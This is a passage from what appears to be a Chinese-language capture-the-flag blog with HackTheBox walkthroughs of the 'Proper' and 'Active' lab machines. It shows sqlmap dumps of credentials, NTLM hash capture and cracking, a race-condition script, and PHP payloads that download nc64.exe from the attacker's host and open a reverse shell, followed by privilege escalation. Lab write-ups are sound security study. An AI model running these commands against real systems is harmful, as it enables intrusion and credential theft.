class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py --dbs --batch --skip-urlencode</span><br><span class="line">available databases [3]:</span><br><span class="line">[*] cleaner</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner --tables --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">[3 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| customers |</span><br><span class="line">| licenses  |</span><br><span class="line">| products  |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T licenses --columns --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: licenses</span><br><span class="line">[4 columns]</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| Column      | Type        |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| customer_id | int(11)     |</span><br><span class="line">| id          | int(11)     |</span><br><span class="line">| license     | varchar(50) |</span><br><span class="line">| product_id  | int(11)     |</span><br><span class="line">+-------------+-------------+</span><br><span class="line"></span><br><span class="line">proxychains sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T licenses -D customer_id,id,license,product_id --dump --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: licenses</span><br><span class="line">[18 entries]</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line">| customer_id | id | license                              | product_id |</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line">| 4           | 1  | 7d4cdf91-119b-414d-b16b-7cb841b2c182 | 4          |</span><br><span class="line">| 17          | 2  | e7b59b20-8c70-48b0-91da-58bf354b18d5 | 8          |</span><br><span class="line">| 17          | 3  | 3ea26f9c-f7c8-428f-a613-f4c66f08d0b9 | 6          |</span><br><span class="line">| 17          | 4  | 372b02bd-8730-4bc6-a6fb-8cf9726f797b | 4          |</span><br><span class="line">| 15          | 5  | 75ab3363-43d4-4e6b-903a-9d36919b36be | 8          |</span><br><span class="line">| 16          | 6  | 139aff78-770c-4c59-9aef-32c4c65e68b3 | 4          |</span><br><span class="line">| 22          | 7  | bdf82583-9f1a-42a3-b892-4b569e77f4c9 | 2          |</span><br><span class="line">| 11          | 8  | d7da6b56-6f8c-4a26-85cc-c80860f3021a | 8          |</span><br><span class="line">| 21          | 9  | 2ca03799-bd0d-4baa-a163-eb2a3b143f22 | 4          |</span><br><span class="line">| 7           | 10 | 0a65e4e4-f1c7-4452-9bf0-02f4d6c35410 | 4          |</span><br><span class="line">| 7           | 11 | 2e14ce43-8e85-43d7-b9ae-ab2c2ff64bf8 | 4          |</span><br><span class="line">| 15          | 12 | 873f8add-2f3c-4da2-9164-649f55c1d329 | 4          |</span><br><span class="line">| 2           | 13 | c63524b6-6346-4a34-b5c3-a3fe46593df1 | 4          |</span><br><span class="line">| 25          | 14 | ad228131-518a-4527-8a1c-46d0723b691d | 2          |</span><br><span class="line">| 1           | 15 | 4fa6a5cd-2081-4222-9b46-6c58df72bcfd | 8          |</span><br><span class="line">| 1           | 16 | 183a7e47-e3cf-46f9-80fa-acb63590cc1c | 2          |</span><br><span class="line">| 9           | 17 | 49dea5ef-3f7f-4790-9b94-b6bf29f5f893 | 2          |</span><br><span class="line">| 4           | 18 | 41e5be3a-20fc-47b2-9dcc-c05def688cdb | 6          |</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T customers --columns --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: customers</span><br><span class="line">[4 columns]</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| Column        | Type         |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| customer_name | varchar(50)  |</span><br><span class="line">| id            | int(11)      |</span><br><span class="line">| login         | varchar(255) |</span><br><span class="line">| password      | varchar(255) |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T customers -C customer_name,id,login,password --dump --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: customers</span><br><span class="line">[11 entries]</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br><span class="line">| customer_name       | id | login                        | password                         |</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br><span class="line">| Vikki Solomon       | 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c |</span><br><span class="line">| Neave Stone         | 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 |</span><br><span class="line">| Bertie McEachern    | 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| Jordana Kleiser     | 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b |</span><br><span class="line">| Mariellen Chasemore | 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b |</span><br><span class="line">| Gwyneth Dornin      | 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 |</span><br><span class="line">| Israel Tootell      | 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 |</span><br><span class="line">| Karon Mangham       | 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a |</span><br><span class="line">| Janifer Blinde      | 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 |</span><br><span class="line">| Laurens Lenchenko   | 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c |</span><br><span class="line">| Andreana Austin     | 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad |</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br></pre></td></tr></table></figure><p>MD5基本都是弱口令</p><p>随意用一个凭证登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=&amp;h=9094e65be4a9dc27cd4af70674a99c64</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\inetpub\wwwroot\functions.php</span></span><br><span class="line"><span class="comment">// Following function securely includes a file. Whenever we </span></span><br><span class="line"><span class="comment">// will encounter a PHP tag we will just bail out here. </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secure_include</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line"><span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">http_response_code(<span class="number">403</span>); </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Forbidden - Tampering attempt detected.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试RFI</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9998</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=http://10.10.16.7:9998/&amp;h=c68113684a9e7ddca835d8f0235e2759</span><br><span class="line"></span><br><span class="line">[2] include(): http:// wrapper is disabled <span class="keyword">in</span> the server configuration by allow_url_include=0</span><br><span class="line">On line 36 <span class="keyword">in</span> file C:\inetpub\wwwroot\functions.php</span><br></pre></td></tr></table></figure><p>不能使用http协议</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -ip 10.10.16.7 -smb2support evil .</span><br><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Incoming connection (10.10.10.231,51174)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)</span><br><span class="line">[*] User PROPER\web authenticated successfully</span><br><span class="line">[*] web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.10.231,51174)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure><p>拿到Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">hash</span> </span><br><span class="line">web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">charlotte123!    (web)</span><br></pre></td></tr></table></figure><p>得到凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web:charlotte123!</span><br></pre></td></tr></table></figure><p>重启smb服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -ip 10.10.16.7 -username web -password charlotte123! -smb2support yolo .</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br></pre></td></tr></table></figure><p>通过竞争修改本地文件内容来进行Bypass</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">payload=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">while</span>((1))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$payload</span>&quot;</span> &gt; header.inc</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>GetShell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hacked&quot;</span>;system(<span class="string">&quot;cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\yolo.exe&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hacked&quot;</span>;system(<span class="string">&quot;cmd /c start \windows\system32\spool\drivers\color\yolo.exe -e cmd 10.10.16.7 9990&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thd</span>():</span></span><br><span class="line">_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> _ &lt; <span class="number">100</span>:</span><br><span class="line">req = requests.session()</span><br><span class="line">login_url = <span class="string">&quot;http://10.10.10.231/licenses/index.php&quot;</span></span><br><span class="line">username = <span class="string">&quot;vikki.solomon@throwaway.mail&quot;</span></span><br><span class="line">password = <span class="string">&quot;password1&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>:username, <span class="string">&quot;password&quot;</span>:password&#125;</span><br><span class="line">res = req.post(url=login_url, data=data)</span><br><span class="line">index_url = <span class="string">&quot;http://10.10.10.231/licenses/licenses.php&quot;</span></span><br><span class="line">res = req.get(url=index_url)</span><br><span class="line">payload_url = <span class="string">&quot;http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7/yolo&amp;h=05e45a8f5f58f601063e937929048fd7&quot;</span></span><br><span class="line">res = req.get(url=payload_url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;hacked&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">print(res.text)</span><br><span class="line">logout_url = <span class="string">&quot;http://10.10.10.231/licenses/logout.php&quot;</span></span><br><span class="line">res = req.get(url=logout_url)</span><br><span class="line">_ += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">poll = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">single_thd = threading.Thread(target=thd)</span><br><span class="line">poll.append(single_thd)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> poll:</span><br><span class="line">n.start()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\nc64.exe</span><br></pre></td></tr></table></figure><p>不行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\yolo.exe</span><br></pre></td></tr></table></figure><p>行</p><p>不知道触发了什么奇怪的bug, 改个文件名就能写入了<br /><s>家目录下就能写, 害隔着World-Writable呢</s></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\web\desktop\user.txt</span><br><span class="line">540dbda93520798e554345539fe38988</span><br></pre></td></tr></table></figure><h2 id="权限提升-6"><a class="markdownIt-Anchor" href="#权限提升-6"></a> 权限提升</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir \&quot;Program Files<span class="string">&quot;\cleanup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">11/15/2020  05:03 AM         2,999,808 client.exe</span></span><br><span class="line"><span class="string">11/15/2020  10:22 AM               174 README.md</span></span><br><span class="line"><span class="string">11/15/2020  06:20 AM         3,041,792 server.exe</span></span><br></pre></td></tr></table></figure><p>FTP莫名其妙用不了</p><p>传文件只能曲线救国了</p><p>Apache2允许PUT但是不能直接上传文件</p><p>不过文件会进行流量传输</p><p>所以就监听流量然后还原文件</p><p>逆向没逆明白, 只能看Raid上的WP了</p><p>先做一个链接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /j \users\web\downloads\yoloyolo \users\administrator\desktop</span><br></pre></td></tr></table></figure><p>操控管道<code>\\.\pipe\cleanuppipe</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> CLEAN \users\web\downloads\yoloyolo\root.txtx &gt; \\.\pipe\cleanuppipe</span><br></pre></td></tr></table></figure><p>此时Server.exe会通过管道的内容来运行程序, 会将程序加密并移动至<code>\programdata\cleanup</code>(这个程序应该是administrator运行的)</p><p>删掉链接, 创建文件夹, 再还原文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rmdir \users\web\downloads\yoloyolo</span><br><span class="line">mkdir \users\web\downloads\yoloyolo</span><br><span class="line"><span class="built_in">echo</span> RESTORE \users\web\downloads\yoloyolo\root.txtx &gt; \\.\pipe\cleanuppipe</span><br><span class="line"><span class="built_in">type</span> \users\web\downloads\yoloyolo\root.txt</span><br><span class="line"></span><br><span class="line">f2167014736b2934e9721962b525f674</span><br></pre></td></tr></table></figure><p><s>这台机子的姿势太骚了</s></p><p>What a box.</p><hr /><h1 id="hackthebox_active"><a class="markdownIt-Anchor" href="#hackthebox_active"></a> HackTheBox_Active</h1><h2 id="端口扫描-7"><a class="markdownIt-Anchor" href="#端口扫描-7"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.100</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.100</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 982 closed ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Microsoft DNS 6.1.7601</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-04 09:21:59Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Service</span><br><span class="line">49152/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-7"><a class="markdownIt-Anchor" href="#漏洞利用-7"></a> 漏洞利用</h2><p>开了53端口，基本确定是台DC</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.10.100</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.10.100</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"> ====================================== </span><br><span class="line">|    OS information on 10.10.10.100    |</span><br><span class="line"> ====================================== </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 458.</span><br><span class="line">Use of uninitialized value <span class="variable">$os_info</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 464.</span><br><span class="line">[+] Got OS info <span class="keyword">for</span> 10.10.10.100 from smbclient: </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 467.</span><br><span class="line">[+] Got OS info <span class="keyword">for</span> 10.10.10.100 from srvinfo:</span><br><span class="line">10.10.10.100   Wk Sv PDC Tim NT     Domain Controller</span><br><span class="line">platform_id     :500</span><br><span class="line">os version      :6.1</span><br><span class="line">server <span class="built_in">type</span>     :0x80102b</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line"> ========================================= </span><br><span class="line">|    Share Enumeration on 10.10.10.100    |</span><br><span class="line"> ========================================= </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 640.</span><br><span class="line"></span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">attacker_folder Disk      </span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">NETLOGON        Disk      Logon server share </span><br><span class="line">Replication     Disk      </span><br><span class="line">SYSVOL          Disk      Logon server share </span><br><span class="line">Users           Disk      </span><br></pre></td></tr></table></figure><p>应该可以匿名登录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.100</span><br><span class="line"></span><br><span class="line">Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">attacker_folder                                   NO ACCESS</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              NO ACCESSRemote IPC</span><br><span class="line">NETLOGON                                          NO ACCESSLogon server share </span><br><span class="line">Replication                                       READ ONLY</span><br><span class="line">SYSVOL                                            NO ACCESSLogon server share </span><br><span class="line">Users                                             NO ACCESS</span><br></pre></td></tr></table></figure><p>下载整个文件夹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.100/Replication</span><br><span class="line">mask <span class="string">&quot;&quot;</span></span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget active.htb</span><br></pre></td></tr></table></figure><p>拿到GPP密文密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat active.htb/Policies/&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;/MACHINE/Preferences/Groups</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;Groups clsid=<span class="string">&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;</span>&gt;&lt;User clsid=<span class="string">&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot;</span> name=<span class="string">&quot;active.htb\SVC_TGS&quot;</span> image=<span class="string">&quot;2&quot;</span> changed=<span class="string">&quot;2018-07-18 20:46:06&quot;</span> uid=<span class="string">&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;</span>&gt;&lt;Properties action=<span class="string">&quot;U&quot;</span> newName=<span 